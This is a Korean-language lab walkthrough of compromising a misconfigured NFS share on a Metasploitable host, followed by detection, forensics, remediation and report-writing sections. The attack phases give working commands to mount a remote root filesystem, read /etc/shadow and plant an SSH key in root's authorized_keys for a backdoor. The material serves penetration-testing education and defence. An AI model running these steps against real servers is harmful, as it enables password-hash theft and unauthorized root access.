1. NFS 아키텍처 및 보안 매커니즘 개요 (Architecture Overview)

NFS(Network File System, 네트워크 파일 시스템)는 Sun Microsystems가 개발한 분산 파일 시스템 프로토콜로, 네트워크상의 다른 컴퓨터에 있는 파일을 마치 로컬 디스크에 있는 것처럼 사용할 수 있게 해줍니다. 하지만 전통적인 NFS(v2, v3)는 보안보다는 성능과 편의성에 초점이 맞춰져 설계되었습니다.

침투의 핵심 동인은 RPC(Remote Procedure Call, 원격 프로시저 호출) 서비스의 정보 노출과 /etc/exports 설정 파일의 미흡한 접근 제어입니다. 특히, 클라이언트의 루트 권한을 서버에서도 그대로 인정해버리는 no_root_squash 옵션은 원격 시스템의 완전한 장악을 가능하게 하는 치명적인 구멍입니다.

[도식: NFS 침투 및 탐지 논리 프로세스]

공격자 (Attacker)
Kali Linux (192.168.10.10)
타겟 (Target)
Metasploitable (192.168.10.50)
로그/분석 (Forensics)
syslog, auth.log, nfsd

2. 실전 침투 시나리오 (Penetration Scenario)

PHASE 01

정보 수집 및 서비스 열거 (Enumeration)

타겟 시스템(192.168.10.50)에서 구동 중인 NFS 서비스의 상세 정보를 확인합니다.

Kali Linux Console
# 1. Nmap을 이용한 포트 스캔 (111: RPCBind, 2049: NFS)
$ nmap -p 111,2049 192.168.10.50
PORT STATE SERVICE
111/tcp open rpcbind # RPC 프로그램 번호를 포트 번호로 변환해주는 서비스
2049/tcp open nfs # 실제 NFS 데이터 통신 포트

# 2. rpcinfo를 통한 서비스 상세 리스트 추출
$ rpcinfo -p 192.168.10.50
program vers proto port service
100000 2 tcp 111 portmapper # RPC 서비스 관리자
100003 2 tcp 2049 nfs # NFS 버전 2
100003 3 tcp 2049 nfs # NFS 버전 3 (상대적으로 취약함)
100005 1 udp 34561 mountd # 마운트 요청 처리 데몬

# 3. 공유 가능한 디렉터리(Exports) 확인
$ showmount -e 192.168.10.50
Export list for 192.168.10.50:
/ * # 치명적 결함: 루트(/) 디렉터리가 모든 호스트(*)에 공개됨
PHASE 02

공격적 마운트 및 데이터 탈취 (Exploitation)

원격 시스템의 루트 권한 파일을 탈취하기 위해 마운트를 수행합니다.

# 1. 로컬에 빈 디렉터리 생성
$ sudo mkdir -p /mnt/meta_root

# 2. NFS 마운트 실행 (옵션 설명: nfsvers=3 - v3 사용, nolock - 파일 잠금 무시)
$ sudo mount -t nfs -o nfsvers=3,nolock 192.168.10.50:/ /mnt/meta_root

# 3. 권한 확인 및 민감 정보 접근
$ ls -ld /mnt/meta_root/root
drwx------ 4 root root 4096 May 20 09:12 /mnt/meta_root/root # 마운트된 곳의 root 폴더가 보임

# 4. 해시(Hash) 탈취
$ sudo cat /mnt/meta_root/etc/shadow | head -n 3
root:$1$LgfW$G/V..:14681:0:99999:7::: # 루트 패스워드 해시값 획득
PHASE 03

영구적 권한 확보 (Persistence)

# SSH 공개키 삽입 (백도어 형성)
$ mkdir -p /mnt/meta_root/root/.ssh # 원격지에 .ssh 폴더 생성
$ cat ~/.ssh/id_rsa.pub >> /mnt/meta_root/root/.ssh/authorized_keys # 내 공개키 삽입
$ chmod 600 /mnt/meta_root/root/.ssh/authorized_keys # 권한 조정

# 이제 마운트를 끊어도 SSH로 루트 접속이 가능함
$ ssh root@192.168.10.50
root@metasploitable:~# # 암호 입력 없이 루트 쉘 즉시 획득

3. 침해 탐지 및 사고 분석 명세 (Detection & Forensics)

ACTION 01

실시간 로그 모니터링 (Live Monitoring)

서버 관리자는 공격이 진행되는 동안 다음과 같은 로그를 실시간으로 확인하여 즉각 대응해야 합니다.

Metasploitable Console
# 1. 시스템 로그를 통한 마운트 시도 감시
$ tail -f /var/log/syslog | grep mountd
rpc.mountd[1234]: authenticated mount request from 192.168.10.10:987 for / (rootid 0)
// 실시간 알림: IP 192.168.10.10에서 루트(/) 경로에 마운트를 시도하고 성공함

# 2. 현재 열려 있는 네트워크 세션 확인
$ netstat -an | grep 2049
tcp 0 0 0.0.0.0:2049 0.0.0.0:* LISTEN # 서버가 열려 있음
tcp 0 0 192.168.10.50:2049 192.168.10.10:765 ESTABLISHED # 공격자와 연결 상태!
ACTION 02

공격 후 로그 분석 (Forensic Investigation)

1단계: 마운트 기록 전수 조사

공격이 언제 시작되었고 어느 IP에서 들어왔는지 타임라인을 구성합니다.

grep "mountd" /var/log/syslog.1
May 20 10:05:22 metasploit rpc.mountd: authenticated mount request from 192.168.10.10 for /

2단계: 백도어 흔적 발견 (Forensic Trace)

루트 계정에 인가되지 않은 SSH 키가 삽입되었는지 확인합니다.

ls -la /root/.ssh/authorized_keys
-rw------- 1 root root 400 May 20 10:15 /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1... kali@kali-linux # 공격자의 호스트네임 발견!

4. 대응 조치 및 현대적 보안 (Remediation & Modern View)

즉각적 보안 조치 (Emergency Fix)

# 1. 모든 공유 강제 종료
$ sudo exportfs -au

# 2. 취약한 설정 파일 전면 수정 (/etc/exports)
$ sudo vi /etc/exports
- / * (rw, sync, no_root_squash) # 삭제 대상
+ /data 192.168.10.100(rw, sync, root_squash) # 특정 IP 한정, root 매핑 강제

# 3. 변경 사항 재적용
$ sudo exportfs -av

최신 NFSv4 서버와의 비교 분석

전통적 NFS (v2, v3)

  • 포트가 분산됨 (111, 2049, 랜덤 포트)
  • IP 기반의 단순 인증 (Spoofing에 취약)
  • 보안 옵션이 기본적으로 비활성화

최신 NFS (v4.x)

  • 2049 포트 하나만 사용 (방화벽 친화적)
  • Kerberos 기반의 강력한 인증 지원
  • 가상 루트(Pseudo Root)를 통한 시스템 격리

침투 가능성 판정 (Modern Verdict)

최신 Ubuntu나 RHEL 서버에서 같은 코드로 마운트를 시도하면, 기본적으로 Refused 오류가 발생합니다. 현대적인 서버는 root_squash가 기본값이며, NFSv4 엔진은 클라이언트의 UID/GID를 서버의 이름 공간과 철저히 격리(ID Mapping)하기 때문입니다. 따라서 v4 환경에서는 Kerberos 티켓을 탈취하지 않는 이상 위와 같은 고전적 침투는 불가능에 가깝습니다.

5. 모의해킹 결과 보고서 작성 (Report Strategy)

Kali 서버에서 수집할 증적

  • showmount -e 192.168.10.50 화면 스크린샷
  • ls -l /mnt/meta_root/etc/shadow 명령의 출력값
  • 공격자 PC에서 생성한 SSH 공개키 정보 (id_rsa.pub)

Meta 서버에서 수집할 증적

  • grep "mount request" /var/log/syslog 로그 내역
  • 수정 전 /etc/exports 파일의 내용
  • last 명령어를 통한 root 계정 로그인 이력

Architect's Note

"진정한 전문가는 공격에 성공한 것을 자랑하는 사람이 아니라, 그 공격이 가능했던 근본 원인(Root Cause)을 정확히 짚어내고 비즈니스 연속성을 보장할 수 있는 최적의 방어 아키텍처를 제시하는 사람입니다. 보고서에는 반드시 '취약점의 위협 수준'과 '조치 우선순위'를 포함하십시오."
